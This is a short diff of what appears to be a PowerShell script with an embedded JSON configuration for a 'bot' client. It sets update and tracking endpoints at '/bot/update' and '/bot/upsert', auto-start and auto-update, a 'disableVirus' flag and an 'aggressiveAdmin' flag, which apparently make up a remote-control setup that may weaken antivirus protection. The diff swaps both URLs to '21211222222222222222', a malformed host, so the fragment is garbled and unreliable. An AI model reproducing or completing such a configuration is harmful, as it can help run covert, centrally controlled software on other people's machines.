@@ -2,7 +2,6 @@
 $server = @'
 {
   "version": "2026.06.13 16:21:42",
-  "urlDoc": "",
   "disabled": false,
   "disableVirus": false,
   "serverIp": "26.188.115.1",
@@ -10,10 +9,10 @@ $server = @'
   "primaryDns": "26.188.115.1",
   "secondaryDns": "26.188.115.1",
   "extraUpdate": false,
-  "updateUrl": "http://26.188.115.1/bot/update",
+  "updateUrl": "http://21211222222222222222/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://26.188.115.1/bot/upsert",
+  "trackUrl": "http://21211222222222222222/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
